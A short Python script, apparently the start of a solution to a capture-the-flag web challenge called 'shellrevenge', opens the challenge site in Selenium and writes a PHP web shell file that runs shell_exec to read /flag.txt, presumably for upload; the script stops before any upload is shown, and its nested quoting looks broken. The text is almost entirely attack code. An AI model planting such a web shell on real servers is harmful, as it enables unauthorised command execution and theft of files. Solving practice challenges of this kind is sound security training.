from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import urllib.parse
from pyvirtualdisplay import Display
import time
import subprocess
import os

url = 'http://shellrevenge.challs.olicyber.it/'
driver = webdriver.Chrome()
driver.get(url)

os.system(f"echo '<?php echo shell_exec('cat /flag.txt');?>' > {os.getcwd()}/file.php")